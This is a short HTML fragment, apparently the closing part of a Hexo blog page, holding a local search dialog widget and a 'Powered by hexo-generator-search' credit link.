+}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>
